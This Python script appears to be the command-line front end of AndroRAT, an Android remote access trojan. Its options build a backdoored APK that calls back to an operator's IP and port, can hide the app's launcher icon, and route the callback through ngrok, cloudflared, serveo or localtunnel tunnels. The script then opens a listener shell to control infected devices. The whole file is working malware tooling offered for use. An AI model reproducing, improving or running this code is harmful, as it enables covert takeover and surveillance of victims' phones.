#!/usr/bin/python
# -*- coding: utf-8 -*-

from utils import *
import argparse
import sys
import platform
from tunneling import create_tunnel_with_alternatives

# Try to import pyngrok but don't fail if not available
try:
    from pyngrok import ngrok, conf
    NGROK_AVAILABLE = True
except ImportError:
    NGROK_AVAILABLE = False
    print(stdOutput("warning")+"\033[1mpyngrok not available - will use alternative tunneling services")
    print(stdOutput("info")+"\033[1mTo use ngrok: pip3 install pyngrok")
    
clearDirec()

#                     _           _____         _______
#     /\             | |         |  __ \     /\|__   __|
#    /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
#   / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
#  / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
# /_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|   
#                                        - By karma9874


parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
parser.add_argument('--build',help='For Building the apk',action='store_true')
parser.add_argument('--shell',help='For getting the Interpreter',action='store_true')
parser.add_argument('--ngrok',help='For using ngrok tunneling (requires credit card for TCP)',action='store_true')
parser.add_argument('--tunnel',help='Auto-select best available tunneling service',action='store_true')
parser.add_argument('--tunnel-service',metavar="<service>", type=str, choices=['ngrok','cloudflared','serveo','localtunnel','auto'], 
                    default='auto', help='Choose tunneling service: ngrok, cloudflared, serveo, localtunnel, auto')
parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
parser.add_argument('-icon','--icon',help='Visible Icon',action='store_true')
args = parser.parse_args()



import sys

# Check Python version properly 
if sys.version_info < (3, 6):
    print(stdOutput("error")+"\033[1mPython version should be 3.6 or higher")
    sys.exit()

if args.build:
    port_ = args.port
    icon=True if args.icon else None
    
    # Handle tunneling options
    if args.ngrok or args.tunnel:
        port = 8000 if not port_ else int(port_)
        
        # Determine which tunneling service to use
        if args.ngrok and NGROK_AVAILABLE:
            service = "ngrok"
        elif args.tunnel:
            service = args.tunnel_service
        else:
            service = "auto"
            
        print(stdOutput("info")+"\033[1mSetting up tunnel...")
        
        # Use new tunneling system
        tunnel_manager, tunnel_result = create_tunnel_with_alternatives(port, service)
        
        if tunnel_result:
            ip, tunnel_port, tunnel_url = tunnel_result
            print(stdOutput("success")+"\033[1mTunnel established successfully!")
            build(ip, tunnel_port, args.output, True, port_, icon)
            
            # Keep tunnel alive during shell if requested
            if tunnel_manager:
                try:
                    get_shell("0.0.0.0", port)
                finally:
                    tunnel_manager.close_tunnel()
        else:
            print(stdOutput("error")+"\033[1mFailed to establish tunnel")
            print(stdOutput("info")+"\033[1mTry using --tunnel-service to specify a different service")
            print(stdOutput("info")+"\033[1mAvailable services: cloudflared, serveo, localtunnel, ngrok")
            sys.exit()
    else:
        if args.ip and args.port:
            build(args.ip,port_,args.output,False,None,icon)
        else:
            print(stdOutput("error")+"\033[1mArguments Missing")
            print(stdOutput("info")+"\033[1mUse --tunnel for automatic tunneling, or provide -i and -p")

if args.shell:
    if args.ip and args.port:
        get_shell(args.ip,args.port) 
    else:
        print(stdOutput("error")+"\033[1mArguments Missing")